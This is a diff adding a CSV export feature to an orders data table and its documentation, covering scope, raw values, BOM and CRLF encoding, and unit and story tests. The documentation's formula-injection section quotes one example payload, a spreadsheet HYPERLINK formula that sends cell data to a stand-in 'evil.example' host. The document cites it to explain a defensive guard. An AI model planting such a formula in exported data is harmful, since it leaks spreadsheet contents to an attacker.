@@ -36,6 +36,7 @@ export function OrdersTable() {
       <DataTable.Toolbar>
         <DataTable.Search />
         <DataTable.ColumnToggle slot="end" />
+        <DataTable.Export slot="end" />
         <DataTable.DensityToggle slot="end" />
       </DataTable.Toolbar>
       <DataTable.Grid className="max-h-[48rem]" />
@@ -80,6 +81,7 @@ export const orderColumns = helper.columns([
 | `DataTable.Grid`          | The table, inside a `DataBoundary`: skeleton, empty, no-results, error, and the refetch bar, stale banner and placeholder dimming over the rows. `className` goes on the scroll container.        |
 | `DataTable.Pagination`    | "Showing 51–100 of 4,213", rows per page (25 / 50 / 100 / 500), "Page 2 of 85", previous / next. Each change is a URL push. Hidden when there is nothing to page through.                         |
 | `DataTable.ColumnToggle`  | "Columns": a menu with a checkbox per data column (labels from `meta.label`) that stays open while toggling, then "Reset to default". See [Column visibility](#column-visibility).                |
+| `DataTable.Export`        | CSV of the visible columns: the current page, or (with a selection) a menu with "Export selected (n)". See [Export](#export).                                                                     |
 | `DataTable.BulkBar`       | A render prop, `{(selection) => actions}`, shown only while rows are selected: "{n} selected", the actions, and Clear. See [The bulk bar](#the-bulk-bar).                                         |
 
 ## Column meta reference
@@ -250,8 +252,25 @@ Selected rows get `data-selected`: the accent tint (`bg-accent-subtle`, contrast
 
 **A failed request** (5xx, network) keeps the dialog open with the error inline, and the selection untouched. Mutations then invalidate every order list and the metrics (see [url-state.md](url-state.md#no-optimistic-updates)): no optimistic updates.
 
+## Export
+
+`<DataTable.Export />` writes a CSV of what the user is looking at.
+
+- **Scope: the selection or the page.** With nothing selected, "Export" downloads the current page. With a selection, it opens a menu: "Export selected (n)" or "Export this page (50 rows)". The selection export works across pages because the selection keeps a snapshot of every row ([Selection](#selection)). Row order: selected rows on the current page first, in its (sorted) order; rows from other pages after them, in the order they were selected. Their relative order across pages isn't known without refetching them, so the export doesn't pretend to sort them.
+- **Visible columns only, in display order.** A hidden column isn't exported, and the selection column never is (`meta.csv: false`). One CSV column per table column, so the file matches the screen: the Orders customer column exports `Name <email>` in one field rather than splitting into two.
+- **Raw values, for spreadsheets.** A column's `meta.csv` function gives its value; without one, it's the raw accessor value, never the formatted cell. Orders: amount `39.98` (2 decimals, no currency symbol, so SUM works), created `2026-10-01T17:51:00.948Z` (ISO, the same in every locale), status and channel their raw values (`paid`, `pos`).
+- **Excel-friendly bytes.** The file starts with a UTF-8 BOM (without it, Excel reads "José" as "JosÃ©"), lines end in CRLF (RFC 4180), and the file ends with a CRLF after the last row. Fields with a comma, quote, CR or LF are quoted, with quotes doubled. Numbers are written with `String()`, never locale-formatted.
+- **The formula-injection guard.** Spreadsheets run a cell that starts with `=`, `+`, `-` or `@` as a formula (and some act on a leading tab or CR). A customer name like `=HYPERLINK("https://evil.example?d="&A1,"Click")` would run in the exporting user's spreadsheet, with access to the rest of the sheet (OWASP "CSV Injection"). [`toCsv`](../src/lib/csv/toCsv.ts) prefixes any such string with `'`, which spreadsheets read as text. Plain numbers are exempt (`-12.50` must stay a number), but only plain ones: `+1` is guarded. Excel hides the apostrophe; Numbers and Google Sheets show it.
+- Disabled (focusable, with the reason in a tooltip) while there's nothing to export: no data yet, or an empty result. A placeholder page (the previous key's rows) isn't exportable either. After a download: a success toast and a polite announcement, "Exported 50 orders".
+- **Filenames:** `orders-page-3-2026-10-02.csv`, `orders-selected-12-2026-10-02.csv` (local date).
+
+The pieces: [`toCsv`](../src/lib/csv/toCsv.ts) is pure (no DOM, no BOM) and fully unit-tested; [`downloadCsv`](../src/lib/csv/downloadCsv.ts) adds the BOM, makes the Blob and the temporary link, and revokes the object URL on the next tick; [`buildCsvColumns`](../src/components/data-table/exportColumns.ts) derives the columns from the TanStack instance.
+
+**"Export all matching" was cut.** Exporting all 4,213 rows of a filtered view needs either a server export job (the server streams the file, or emails a link, and the UI shows progress) or client-side paged fetching (fetch every page in sequence, with a progress bar, a Cancel that aborts the in-flight request, and a cap so nobody downloads a million rows into a browser tab). Both are real features of their own, and the mock API has no export endpoint.
+
 ## Testing
 
 - **Unit** ([`__tests__/`](../src/components/data-table/__tests__/)): sorting derivation and the `onSortingChange` → `setSort` mapping, pagination math (partial last page, total 0), header `aria-sort` and button names, the escape hatch writing the URL, the search draft (debounce with fake timers, Enter, outside changes, no reset loop), announcements, and the type-level checks (`dataColumn` requires a label; the root has exactly three props).
 - **Selection and visibility (unit):** the pure model (toggle, ranges in both directions, deselecting ranges, the per-page anchor, selectPage / clearPage, remove, the header state), the scope rules through the real hook and URL (kept across pages and sizes, cleared on sort / q / filters and on Back to another view, kept across refetches), `useColumnVisibility` (persistence, bad JSON, unknown ids, non-hideable, the last-visible guard), and `summarizeBulkResult` (all / partial / none, plurals).
-- **Stories** (real Chromium, MSW, axe in both themes and densities): the sort cycle with `aria-sort` and the announcement, Next page served from the prefetch cache (no new request in the log), search with at most one history entry, Back restoring sort and search, Clear filters, page size 100, and the narrow container's horizontal scroll with a sticky header. For 4b: the header checkbox (mixed state), shift+click, selection across pages and cleared by a sort, Escape in the bar, a partial bulk success (toast, details, failed rows still selected), a failed bulk request (inline error, dialog open), and columns hidden, persisted across a remount, reset, and the last one locked. The axe check also runs with the column menu open, the dialogs open and the bar visible.
+- **Export (unit):** `toCsv` quoting (comma, quote, CR, LF, a mix), the formula guard (and its numeric exemption), Unicode, null / undefined, CRLF and the final line ending; `buildCsvColumns` (visibility, order, `csv: false`, `csv` over the accessor); the selected-row order; `exportFilename`; and `downloadCsv` (the BOM bytes, the link, the object URL revoked on the next tick).
+- **Stories** (real Chromium, MSW, axe in both themes and densities): the sort cycle with `aria-sort` and the announcement, Next page served from the prefetch cache (no new request in the log), search with at most one history entry, Back restoring sort and search, Clear filters, page size 100, and the narrow container's horizontal scroll with a sticky header. For 4b: the header checkbox (mixed state), shift+click, selection across pages and cleared by a sort, Escape in the bar, a partial bulk success (toast, details, failed rows still selected), a failed bulk request (inline error, dialog open), and columns hidden, persisted across a remount, reset, and the last one locked. The axe check also runs with the column menu open, the dialogs open and the bar visible. For 4c: the exported Blob (captured from `URL.createObjectURL`) has the BOM, the visible columns as its header, 50 rows and CRLF only; hiding Channel removes it; a 5-row selection across two pages exports exactly those ids; and the toast appears.
